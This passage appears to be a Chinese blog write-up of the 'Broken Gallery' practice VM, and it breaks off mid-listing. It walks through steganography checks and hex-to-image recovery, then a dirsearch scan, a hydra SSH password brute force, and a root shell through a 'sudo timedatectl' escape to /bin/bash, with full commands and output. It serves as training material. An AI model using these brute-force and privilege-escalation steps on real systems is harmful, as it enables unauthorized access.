+<h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p><img src="/pic/4ad4dde687a7d68e4c606b90ca22803c_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>把文件都下载到本地，然后看看是否有隐写的信息，分别使用 <code>file</code>，<code>binwalk</code>，<code>exiftool</code> 和 <code>strings</code> </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Broken_Gallery]<br>└─$ file *          <br>img_5terre.jpg:    JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, progressive, precision 8, 1200x900, components 3<br>img_forest.jpg:    JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, progressive, precision 8, 750x425, components 3<br>img_lights.jpg:    JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 2988x1680, components 3<br>img_mountains.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 314x160, components 3<br>README.md:         CSV text<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Broken_Gallery]<br>└─$ binwalk *             <br><br>Scan Time:     2023-06-26 05:05:26<br>Target File:   /home/kali/Downloads/Broken_Gallery/img_5terre.jpg<br>MD5 Checksum:  5d37289a16584a465eaacb52e58521d4<br>Signatures:    411<br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             JPEG image data, JFIF standard 1.01<br><br><br>Scan Time:     2023-06-26 05:05:26<br>Target File:   /home/kali/Downloads/Broken_Gallery/img_forest.jpg<br>MD5 Checksum:  761a639a8a0e2ddac1818348eba4bc3d<br>Signatures:    411<br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             JPEG image data, JFIF standard 1.01<br><br><br>Scan Time:     2023-06-26 05:05:26<br>Target File:   /home/kali/Downloads/Broken_Gallery/img_lights.jpg<br>MD5 Checksum:  dc0703a8dd937fae387b639dc73827c1<br>Signatures:    411<br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             JPEG image data, JFIF standard 1.01<br><br><br>Scan Time:     2023-06-26 05:05:26<br>Target File:   /home/kali/Downloads/Broken_Gallery/img_mountains.jpg<br>MD5 Checksum:  8412b3da2a31506bb24050ba8cf6d413<br>Signatures:    411<br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             JPEG image data, JFIF standard 1.01<br><br><br>Scan Time:     2023-06-26 05:05:26<br>Target File:   /home/kali/Downloads/Broken_Gallery/README.md<br>MD5 Checksum:  db082d3bc4489f6fd9258b79154b0965<br>Signatures:    411<br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Broken_Gallery]<br>└─$ exiftool *             <br>======== img_5terre.jpg<br>ExifTool Version Number         : 12.57<br>File Name                       : img_5terre.jpg<br>Directory                       : .<br>File Size                       : 265 kB<br>File Modification Date/Time     : 2019:08:09 04:11:02-04:00<br>File Access Date/Time           : 2023:06:26 05:04:52-04:00<br>File Inode Change Date/Time     : 2023:06:26 05:03:28-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>JFIF Version                    : 1.01<br>Resolution Unit                 : inches<br>X Resolution                    : 72<br>Y Resolution                    : 72<br>Image Width                     : 1200<br>Image Height                    : 900<br>Encoding Process                : Progressive DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 3<br>Y Cb Cr Sub Sampling            : YCbCr4:2:2 (2 1)<br>Image Size                      : 1200x900<br>Megapixels                      : 1.1<br>======== img_forest.jpg<br>ExifTool Version Number         : 12.57<br>File Name                       : img_forest.jpg<br>Directory                       : .<br>File Size                       : 117 kB<br>File Modification Date/Time     : 2019:08:09 04:11:02-04:00<br>File Access Date/Time           : 2023:06:26 05:04:52-04:00<br>File Inode Change Date/Time     : 2023:06:26 05:03:37-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>JFIF Version                    : 1.01<br>Resolution Unit                 : inches<br>X Resolution                    : 96<br>Y Resolution                    : 96<br>Image Width                     : 750<br>Image Height                    : 425<br>Encoding Process                : Progressive DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 3<br>Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)<br>Image Size                      : 750x425<br>Megapixels                      : 0.319<br>======== img_lights.jpg<br>ExifTool Version Number         : 12.57<br>File Name                       : img_lights.jpg<br>Directory                       : .<br>File Size                       : 679 kB<br>File Modification Date/Time     : 2019:08:09 04:11:02-04:00<br>File Access Date/Time           : 2023:06:26 05:04:52-04:00<br>File Inode Change Date/Time     : 2023:06:26 05:03:44-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>JFIF Version                    : 1.01<br>Resolution Unit                 : None<br>X Resolution                    : 1<br>Y Resolution                    : 1<br>Profile CMM Type                : Little CMS<br>Profile Version                 : 2.1.0<br>Profile Class                   : Display Device Profile<br>Color Space Data                : RGB<br>Profile Connection Space        : XYZ<br>Profile Date Time               : 2012:01:25 03:41:57<br>Profile File Signature          : acsp<br>Primary Platform                : Apple Computer Inc.<br>CMM Flags                       : Not Embedded, Independent<br>Device Manufacturer             : <br>Device Model                    : <br>Device Attributes               : Reflective, Glossy, Positive, Color<br>Rendering Intent                : Perceptual<br>Connection Space Illuminant     : 0.9642 1 0.82491<br>Profile Creator                 : Little CMS<br>Profile ID                      : 0<br>Profile Description             : c2<br>Profile Copyright               : FB<br>Media White Point               : 0.9642 1 0.82491<br>Media Black Point               : 0.01205 0.0125 0.01031<br>Red Matrix Column               : 0.43607 0.22249 0.01392<br>Green Matrix Column             : 0.38515 0.71687 0.09708<br>Blue Matrix Column              : 0.14307 0.06061 0.7141<br>Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)<br>Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)<br>Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)<br>Image Width                     : 2988<br>Image Height                    : 1680<br>Encoding Process                : Baseline DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 3<br>Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)<br>Image Size                      : 2988x1680<br>Megapixels                      : 5.0<br>======== img_mountains.jpg<br>ExifTool Version Number         : 12.57<br>File Name                       : img_mountains.jpg<br>Directory                       : .<br>File Size                       : 8.6 kB<br>File Modification Date/Time     : 2019:08:09 04:11:02-04:00<br>File Access Date/Time           : 2023:06:26 05:04:52-04:00<br>File Inode Change Date/Time     : 2023:06:26 05:03:51-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>JFIF Version                    : 1.01<br>Resolution Unit                 : None<br>X Resolution                    : 1<br>Y Resolution                    : 1<br>Image Width                     : 314<br>Image Height                    : 160<br>Encoding Process                : Baseline DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 3<br>Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)<br>Image Size                      : 314x160<br>Megapixels                      : 0.050<br>======== README.md<br>ExifTool Version Number         : 12.57<br>File Name                       : README.md<br>Directory                       : .<br>File Size                       : 57 kB<br>File Modification Date/Time     : 2019:08:09 04:20:02-04:00<br>File Access Date/Time           : 2023:06:26 05:04:52-04:00<br>File Inode Change Date/Time     : 2023:06:26 05:03:09-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : TXT<br>File Type Extension             : txt<br>MIME Type                       : text/plain<br>MIME Encoding                   : us-ascii<br>Newlines                        : Unix LF<br>Line Count                      : 584<br>Word Count                      : 9335<br>    5 image files <span class="hljs-built_in">read</span><br></code></pre></td></tr></table></figure>
+
+<p>有个色彩通道提取数据的提示<code>Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Broken_Gallery]<br>└─$ exiftool -b img_lights.jpg <br>12.57img_lights.jpg.6789092019:08:09 04:11:02-04:002023:06:26 05:04:52-04:002023:06:26 05:03:44-04:00100644JPEGJPGimage/jpeg1 1011lcms528mntrRGB XYZ 2012:01:25 03:41:57acspAPPL00 000.9642 1 0.82491lcms0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0c2FB0.9642 1 0.824910.01205 0.0125 0.010310.43607 0.22249 0.013920.38515 0.71687 0.097080.14307 0.06061 0.7141curv▒��ck<br>   �?Q!�)�2▒;�FQw]�kpz���|�i�&#125;���0��curv▒��ck<br>                                             �?Q!�)�2▒;�FQw]�kpz���|�i�&#125;���0��curv▒��ck<br>                                                                                       �?Q!�)�2▒;�FQw]�kpz���|�i�&#125;���0��298816800832 22988 16805.01984<br></code></pre></td></tr></table></figure>
+
+<p>没什么用，另外其中提到了一个 little cms，搜索后发现是个色彩管理的工具，也没有明显的漏洞，那关注点主要放在 md 文件上，打开文件发现是十六进制的数据</p>
+<p><img src="/pic/6e130fde7173922c751af2f212422344_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接问 chatgpt 吧</p>
+<p><img src="/pic/ac0e51343e517f11244b96f6da97a93f_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>原来是 jpg 文件，的确文件头和文件末尾都符合 jpg 文件的特征</p>
+<blockquote>
+<p>ZIP Archive (zip)，文件头：50 4B 03 04 文件尾：50 4B<br> RAR Archive (rar)，文件头：52 61 72 21<br> JPEG (jpg)，文件头：FF D8 FF 文件尾：FF D9<br> PNG (png)，文件头：89 50 4E 47 文件尾：AE 42 60 82<br> GIF (gif)，文件头：47 49 46 38 文件尾：00 3B<br> TIFF (tif)，文件头：49 49 2A 00 Windows Bitmap (bmp)，文件头：42 4D AE 0A 0B<br> 7-ZIP compressed file(7z) , 文件头：37 7A BC AF 27 1C<br> avi(RIFF) :52 49 46 46</p>
+</blockquote>
+<h2 id="十六进制转图片"><a href="#十六进制转图片" class="headerlink" title="十六进制转图片"></a>十六进制转图片</h2><p>接下来需要把这些十六进制转化为图片，一开始想使用编辑器，但是并没有实现转化为图片的效果，后续搜索了个在线工具：<a target="_blank" rel="noopener" href="https://www.lzltool.com/hextoimage">在线十六进制转图片—LZL在线工具 (lzltool.com)</a>，转化成功。当然，这里要对数据进行预处理，将逗号，空格和 0x 都删去，借助于记事本就可以做到，然后将其复制粘贴到网页中，以防那个万一，这里我们还可以将图片下载到本地再次使用 exiftool 等工具进行判断是否有隐写信息</p>
+<p><img src="/pic/3af14004003dccd8577ed5b2d7559599_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>给的信息很有限，仅仅算是获得了几个用户名和一个 application 名。到这里有点束手无策，之前目录爆破也没什么结果，接下来手动尝试试试，将上述图片中的 <code>application</code>，<code>BROEKN</code>，<code>avrahamcohen</code> 作为目录逐一进行尝试，但都没什么结果。在这里卡了很久，甚至尝试了爆破<code>http://192.1.1.141/icons</code></p>
+<blockquote>
+<p>这里如果不使用在线网站的话，可以使用以下命令将文件转化为二进制，再利用 strings 和 head 配合来判断文件的内容和类型<br><code>xxd -r -ps README.md &gt; README.bin</code><br><code>strings README.bin | head -n 20</code></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads]<br>└─$ sudo dirsearch -u http://192.1.1.141/icons<br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.1.1.141/-icons_23-06-26_07-57-03.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-06-26_07-57-03.<span class="hljs-built_in">log</span><br><br>Target: http://192.1.1.141/icons/<br><br>[07:57:03] Starting: <br>[07:57:04] 403 -  303B  - /icons/.ht_wsr.txt                               <br>[07:57:04] 403 -  308B  - /icons/.htaccess.sample                          <br>[07:57:04] 403 -  306B  - /icons/.htaccess.orig<br>[07:57:04] 403 -  306B  - /icons/.htaccess.bak1<br>[07:57:04] 403 -  306B  - /icons/.htaccess.save<br>[07:57:04] 403 -  305B  - /icons/.htaccessOLD2<br>[07:57:04] 403 -  306B  - /icons/.htaccess_orig<br>[07:57:04] 403 -  307B  - /icons/.htaccess_extra<br>[07:57:04] 403 -  304B  - /icons/.htaccess_sc<br>[07:57:04] 403 -  304B  - /icons/.htaccessBAK                              <br>[07:57:04] 403 -  297B  - /icons/.html<br>[07:57:04] 403 -  304B  - /icons/.htaccessOLD<br>[07:57:04] 403 -  296B  - /icons/.htm<br>[07:57:04] 403 -  302B  - /icons/.htpasswds<br>[07:57:04] 403 -  306B  - /icons/.htpasswd_test<br>[07:57:04] 403 -  303B  - /icons/.httr-oauth                               <br>[07:57:07] 200 -    5KB - /icons/README                                     <br>[07:57:07] 200 -   35KB - /icons/README.html<br></code></pre></td></tr></table></figure>
+
+<h2 id="ssh爆破"><a href="#ssh爆破" class="headerlink" title="ssh爆破"></a>ssh爆破</h2><p>看了眼 WP，原来是将上述收集的信息（包括图片名中有实意的部分和恢复的图片中的人名、加粗的单词）转化为字典，然后 ssh 爆破……这么简单粗暴的思路我竟无言以对，虽然的确有道理，但是用户和密码都是 BROKEN 还是有点离谱（</p>
+<blockquote>
+<p>这里红队笔记 UP 提了一个角度：靶机实质上是实战环境的抽象，因此不能要求其信息是条理清晰地给到你，因为实战环境是更杂乱的。这个角度的确是过去没思考到的</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Broken_Gallery]<br>└─$ hydra -L user -P passwd 192.1.1.141 ssh   <br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-26 08:25:54<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task<br>[DATA] attacking ssh://192.1.1.141:22/<br>[22][ssh] host: 192.1.1.141   login: broken   password: broken<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-26 08:25:59<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Broken_Gallery]<br>└─$ ssh broken@192.1.1.141<br>The authenticity of host <span class="hljs-string">&#x27;192.1.1.141 (192.1.1.141)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:2rSjxvkij5hWypyT/706pdaI6YAB0AOIXa7kVnMBDZs.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.1.1.141<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">broken@192.1.1.141\&#x27;</span>s password: <br>Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com/<br><br>762 packages can be updated.<br>458 updates are security updates.<br><br>Last login: Fri Aug  9 02:40:48 2019 from 10.11.1.221<br>broken@ubuntu:~$ <span class="hljs-built_in">ls</span><br>Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos<br>broken@ubuntu:~$ <span class="hljs-built_in">whoami</span><br>broken<br>broken@ubuntu:~$ <span class="hljs-built_in">id</span><br>uid=1000(broken) gid=1000(broken) <span class="hljs-built_in">groups</span>=1000(broken),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)<br>broken@ubuntu:~$ <span class="hljs-built_in">uname</span> -a<br>Linux ubuntu 4.4.0-21-generic <span class="hljs-comment">#37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br>broken@ubuntu:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:3b:1c:1c brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.141/24 brd 192.1.1.255 scope global dynamic ens33<br>       valid_lft 1524sec preferred_lft 1524sec<br>    inet6 fe80::46:b9bd:c17c:f599/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>broken@ubuntu:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> broken on ubuntu:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User broken may run the following commands on ubuntu:<br>    (ALL) NOPASSWD: /usr/bin/timedatectl<br>    (ALL) NOPASSWD: /sbin/reboot<br></code></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>去 gtfobins 搜一搜</p>
+<p><img src="/pic/b6be9112069e2d27bb9a24d004f81a95_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="timedatectl-shell"><a href="#timedatectl-shell" class="headerlink" title="timedatectl shell"></a>timedatectl shell</h3><p><code>timedatectl</code> 可以新开 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">broken@ubuntu:~$ sudo timedatectl list-timezones<br>……<br>!/bin/bash<br>root@ubuntu:~<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@ubuntu:~<span class="hljs-comment"># whoami</span><br>root<br>root@ubuntu:~<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:3b:1c:1c brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.141/24 brd 192.1.1.255 scope global dynamic ens33<br>       valid_lft 1233sec preferred_lft 1233sec<br>    inet6 fe80::46:b9bd:c17c:f599/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@ubuntu:~<span class="hljs-comment"># uname -a</span><br>Linux ubuntu 4.4.0-21-generic <span class="hljs-comment">#37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br><br></code></pre></td></tr></table></figure>
+
+<h3 id="Linux-Polkit-helper-提权"><a href="#Linux-Polkit-helper-提权" class="headerlink" title="Linux Polkit helper 提权"></a>Linux Polkit helper 提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">broken@ubuntu:/etc$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>     1398     56 -rwsr-xr-x   1 root     root        54256 Mar 29  2016 /usr/bin/passwd<br>     1883    136 -rwsr-xr-x   1 root     root       136808 Mar 30  2016 /usr/bin/sudo<br>     1507     24 -rwsr-xr-x   1 root     root        23376 Jan 17  2016 /usr/bin/pkexec<br>      936     76 -rwsr-xr-x   1 root     root        75304 Mar 29  2016 /usr/bin/gpasswd<br>      616     40 -rwsr-xr-x   1 root     root        40432 Mar 29  2016 /usr/bin/chsh<br>     1335     40 -rwsr-xr-x   1 root     root        39904 Mar 29  2016 /usr/bin/newgrp<br>      614     52 -rwsr-xr-x   1 root     root        49584 Mar 29  2016 /usr/bin/chfn<br>     1962     24 -rwsr-xr-x   1 root     root        23304 Apr 15  2016 /usr/bin/ubuntu-core-launcher<br>    14572    384 -rwsr-xr--   1 root     dip        390888 Jan 29  2016 /usr/sbin/pppd<br>   429498     12 -r-sr-xr-x   1 root     root         9532 Aug  9  2019 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper<br>   577108     16 -r-sr-xr-x   1 root     root        14320 Aug  9  2019 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper<br>     5149     12 -rwsr-xr-x   1 root     root        10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device<br>     9869     16 